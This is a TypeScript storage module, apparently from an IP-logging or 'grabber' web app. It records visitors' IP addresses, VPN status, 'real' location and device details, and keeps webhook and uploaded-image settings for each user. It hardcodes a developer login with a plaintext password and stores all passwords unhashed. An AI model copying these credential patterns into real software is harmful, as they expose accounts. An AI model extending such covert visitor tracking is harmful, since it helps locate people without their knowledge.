import { type User, type InsertUser, type IpLog, type InsertIpLog, type Settings, type InsertSettings, type AccessKey, type InsertAccessKey, type UserSession, type InsertUserSession } from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  // User operations
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUserTheme(userId: string, theme: string): Promise<void>;
  
  // Access key operations
  createAccessKey(key: InsertAccessKey): Promise<AccessKey>;
  getAccessKey(key: string): Promise<AccessKey | undefined>;
  useAccessKey(key: string): Promise<boolean>;
  getUserAccessKeys(userId: string): Promise<AccessKey[]>;
  
  // Session operations
  createSession(session: InsertUserSession): Promise<UserSession>;
  getSession(token: string): Promise<UserSession | undefined>;
  deleteSession(token: string): Promise<void>;
  
  // IP Log operations
  createIpLog(ipLog: InsertIpLog): Promise<IpLog>;
  getIpLogs(userId?: string, limit?: number, offset?: number): Promise<IpLog[]>;
  getTotalIpLogs(userId?: string): Promise<number>;
  getUniqueIpCount(userId?: string): Promise<number>;
  getRecentLogs(userId?: string, hours?: number): Promise<IpLog[]>;
  
  // Settings operations
  getSettings(userId: string): Promise<Settings | undefined>;
  createOrUpdateSettings(settings: InsertSettings): Promise<Settings>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private ipLogs: Map<string, IpLog>;
  private settings: Map<string, Settings>;
  private accessKeys: Map<string, AccessKey>;
  private sessions: Map<string, UserSession>;

  constructor() {
    this.users = new Map();
    this.ipLogs = new Map();
    this.settings = new Map();
    this.accessKeys = new Map();
    this.sessions = new Map();
    this.initializeDevAccount();
  }

  private async initializeDevAccount() {
    const devUser: User = {
      id: randomUUID(),
      username: "exnldev",
      password: "Av121988-",
      theme: "default",
      isDev: true,
      createdAt: new Date(),
    };
    this.users.set(devUser.id, devUser);
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { 
      ...insertUser, 
      id,
      theme: "default",
      isDev: false,
      createdAt: new Date()
    };
    this.users.set(id, user);
    return user;
  }

  async updateUserTheme(userId: string, theme: string): Promise<void> {
    const user = this.users.get(userId);
    if (user) {
      this.users.set(userId, { ...user, theme });
    }
  }

  async createAccessKey(insertKey: InsertAccessKey): Promise<AccessKey> {
    const id = randomUUID();
    const accessKey: AccessKey = {
      ...insertKey,
      id,
      usedCount: 0,
      createdAt: new Date()
    };
    this.accessKeys.set(insertKey.key, accessKey);
    return accessKey;
  }

  async getAccessKey(key: string): Promise<AccessKey | undefined> {
    return this.accessKeys.get(key);
  }

  async useAccessKey(key: string): Promise<boolean> {
    const accessKey = this.accessKeys.get(key);
    if (!accessKey || !accessKey.isActive || accessKey.usedCount >= accessKey.usageLimit) {
      return false;
    }
    this.accessKeys.set(key, { ...accessKey, usedCount: accessKey.usedCount + 1 });
    return true;
  }

  async getUserAccessKeys(userId: string): Promise<AccessKey[]> {
    return Array.from(this.accessKeys.values()).filter(key => key.createdBy === userId);
  }

  async createSession(insertSession: InsertUserSession): Promise<UserSession> {
    const id = randomUUID();
    const session: UserSession = {
      ...insertSession,
      id,
      createdAt: new Date()
    };
    this.sessions.set(insertSession.sessionToken, session);
    return session;
  }

  async getSession(token: string): Promise<UserSession | undefined> {
    const session = this.sessions.get(token);
    if (session && session.expiresAt > new Date()) {
      return session;
    }
    if (session) {
      this.sessions.delete(token);
    }
    return undefined;
  }

  async deleteSession(token: string): Promise<void> {
    this.sessions.delete(token);
  }

  async createIpLog(insertIpLog: InsertIpLog): Promise<IpLog> {
    const id = randomUUID();
    const ipLog: IpLog = {
      id,
      userId: insertIpLog.userId || null,
      ipAddress: insertIpLog.ipAddress,
      userAgent: insertIpLog.userAgent || null,
      referrer: insertIpLog.referrer || null,
      location: insertIpLog.location || null,
      status: insertIpLog.status || 'success',
      isVpn: insertIpLog.isVpn || null,
      vpnLocation: insertIpLog.vpnLocation || null,
      realLocation: insertIpLog.realLocation || null,
      deviceType: insertIpLog.deviceType || null,
      browserName: insertIpLog.browserName || null,
      operatingSystem: insertIpLog.operatingSystem || null,
      deviceBrand: insertIpLog.deviceBrand || null,
      timestamp: new Date(),
    };
    this.ipLogs.set(id, ipLog);
    return ipLog;
  }

  async getIpLogs(userId?: string, limit: number = 50, offset: number = 0): Promise<IpLog[]> {
    let logs = Array.from(this.ipLogs.values());
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    return logs
      .sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime())
      .slice(offset, offset + limit);
  }

  async getTotalIpLogs(userId?: string): Promise<number> {
    if (userId) {
      return Array.from(this.ipLogs.values()).filter(log => log.userId === userId).length;
    }
    return this.ipLogs.size;
  }

  async getUniqueIpCount(userId?: string): Promise<number> {
    let logs = Array.from(this.ipLogs.values());
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    const uniqueIps = new Set(logs.map(log => log.ipAddress));
    return uniqueIps.size;
  }

  async getRecentLogs(userId?: string, hours: number = 1): Promise<IpLog[]> {
    const cutoff = new Date(Date.now() - hours * 60 * 60 * 1000);
    let logs = Array.from(this.ipLogs.values()).filter(log => log.timestamp >= cutoff);
    if (userId) {
      logs = logs.filter(log => log.userId === userId);
    }
    return logs.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
  }

  async getSettings(userId: string): Promise<Settings | undefined> {
    return this.settings.get(userId);
  }

  async createOrUpdateSettings(insertSettings: InsertSettings): Promise<Settings> {
    const existingSettings = this.settings.get(insertSettings.userId);
    const settings: Settings = {
      id: existingSettings?.id || randomUUID(),
      userId: insertSettings.userId,
      webhookUrl: insertSettings.webhookUrl || null,
      uploadedImageName: insertSettings.uploadedImageName || null,
      uploadedImageData: insertSettings.uploadedImageData || null,
      uploadedImageType: insertSettings.uploadedImageType || null,
      createdAt: existingSettings?.createdAt || new Date(),
      updatedAt: new Date(),
    };
    this.settings.set(insertSettings.userId, settings);
    return settings;
  }
}

export const storage = new MemStorage();